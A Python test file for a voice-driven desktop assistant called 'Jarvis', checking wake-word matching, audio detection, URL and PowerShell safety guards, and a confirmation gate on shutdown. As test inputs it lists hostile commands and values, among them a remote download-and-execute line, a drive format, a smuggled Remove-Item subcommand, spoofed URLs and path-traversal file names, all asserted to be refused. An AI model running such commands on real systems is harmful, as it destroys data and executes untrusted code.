"""Fast offline tests (no network, no side effects):  python tests/test_offline.py"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import numpy as np  # noqa: E402

from jarvis import audio, config, speech, tools, wake  # noqa: E402
from jarvis.events import Hub  # noqa: E402
from jarvis.tools import coder, desktop, ui, web  # noqa: E402


def test_url_guard():
    for good in ["https://github.com", "youtube.com", "localhost:8080/x", "www.google.com/search?q=a+b"]:
        assert web.safe_url(good).startswith(("http://", "https://")), good
    for bad in ["file:///C:/Windows", "javascript:alert(1)", "ms-settings:privacy", "https://evil.com@bank.com", "\\\\srv\\share"]:
        try:
            web.safe_url(bad)
            raise AssertionError(f"accepted unsafe URL {bad}")
        except ValueError:
            pass


def test_powershell_safety():
    for cmd in ["Get-Process | Sort-Object CPU -Descending | Select-Object -First 5", "ipconfig", "Get-PSDrive C",
                "git status", "python --version"]:
        assert desktop.is_read_only(cmd), cmd
    for cmd in ["Remove-Item x.txt", "Get-ChildItem $(Remove-Item x)", "$a = Remove-Item x", "Get-Process | Stop-Process",
                "echo hi > file.txt", "Set-Content a.txt hi", "& calc", "Get-Process; Restart-Computer", "del x"]:
        assert not desktop.is_read_only(cmd), cmd
    assert "refused" in desktop.run_command(None, "Format-Volume -DriveLetter D", "x")
    assert "refused" in desktop.run_command(None, "iex (iwr http://x)", "x")


def test_event_hub():
    hub = Hub()
    hub.set_state("listening")
    hub.emit("heard", text="open notepad")
    events = hub.since(0)
    assert hub.state == "listening" and [e["kind"] for e in events] == ["state", "heard"]
    assert hub.since(events[-1]["seq"]) == []
    assert not hub.interrupted()
    hub.answers.put(True)
    assert hub.interrupted() and hub.take_answer() is True and hub.take_answer() is None
    hub.stop.set()
    assert hub.interrupted()


def test_wake_word_matching():
    for text, rest in [("Hey Jarvis.", ""), ("Hey Jarvis, open notepad", "open notepad"), ("hey jervis what time is it", "what time is it"),
                       ("Javis play music", "play music"), ("OK Jarwis", "")]:
        assert wake.find_wake_word(text) == (True, rest), text
    for text in ["what's the weather", "hey travis how are you", "service please", ""]:
        assert not wake.find_wake_word(text)[0], text
    quiet = (np.ones(config.CHUNK) * 10).astype(np.int16)
    assert not wake.prepare(quiet).any()  # noise gate


def test_desktop_agent_reads_windows():
    state, view, _ = ui._observe()
    assert "FOREGROUND WINDOW" in view and ui._elements


def test_code_paths_stay_in_workspace():
    config.CODE_WORKSPACE = tempfile.mkdtemp()
    for name in ["../../evil.py", "C:\\Windows\\x.bat", "..", "", "a b$c.py"]:
        path = coder._safe_path(name)
        assert os.path.dirname(path) == config.CODE_WORKSPACE and not os.path.exists(path), path


def test_transcript_helpers():
    assert speech.strip_wake_phrase("Hey Jarvis, open notepad") == "open notepad"
    assert speech.strip_wake_phrase("Jarvis. Open Notepad.") == "Open Notepad."
    assert not speech.is_complete("Make a python script that...")
    assert not speech.is_complete("Notepad khol ke")
    assert speech.is_complete("Open notepad.")
    assert speech.yes_no("Yes, go ahead") is True and speech.yes_no("haan") is True
    assert speech.yes_no("No.") is False and speech.yes_no("nahi") is False
    assert speech.yes_no("what was that") is None


def test_vad_rejects_silence_and_noise():
    detector = audio.SpeechDetector()
    rng = np.random.default_rng(0)
    for chunk in [np.zeros(config.CHUNK, np.int16), (rng.standard_normal(config.CHUNK) * 300).astype(np.int16)]:
        detector.reset()
        assert not any(detector.is_speech(chunk) for _ in range(10))


def test_snapshot_compaction():
    snap = "\n".join([
        '- generic [ref=e1] [box=0,0,1280,3000]:',
        '  - navigation "Hidden" [ref=e2] [box=-9988,10,400,400]:',
        '    - link "Skip" [ref=e3] [box=-9968,20,50,20]',
        '  - generic [ref=e4] [box=0,0,1280,800]:',
        '    - combobox "From" [ref=f1e68] [cursor=pointer] [box=100,200,300,40]',
        '    - /url: https://example.com',
        '    - generic [ref=e9] [box=100,250,20,20]: \ue000',
        '  - button "Far below" [ref=e10] [box=100,2900,100,40]',
    ])
    out = web.compact_snapshot(snap, 0, 1600)
    assert 'combobox "From" [ref=f1e68]' in out and "Skip" not in out and "/url" not in out
    assert "Far below" not in out and "scroll down" in out and "box=" not in out and "cursor" not in out


def test_tool_registry_and_gate():
    names = set(tools.REGISTRY)
    assert {"open_app", "close_app", "browser_task", "write_code", "system_control", "set_timer"} <= names
    for schema in tools.schemas():
        assert schema["function"]["parameters"]["type"] == "object"

    class NoVoice:
        asked = []
        def confirm(self, q): self.asked.append(q); return False
    voice = NoVoice()
    ctx = tools.Context(voice)
    # dangerous power action must be confirmed; a "no" cancels without running it
    assert tools.execute("system_control", '{"action": "shutdown"}', ctx).startswith("CANCELLED") and voice.asked
    assert tools.execute("nope", "{}", ctx).startswith("ERROR")
    assert tools.execute("open_url", "not json", ctx).startswith("ERROR")
    assert tools.execute("open_url", "{}", ctx).startswith("ERROR: missing")
    assert "refusing" in tools.execute("open_url", '{"url": "file:///C:/"}', ctx)


if __name__ == "__main__":
    tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_")]
    for name, fn in tests:
        fn()
        print(f"PASS {name}")
    print(f"\nAll {len(tests)} offline tests passed.")
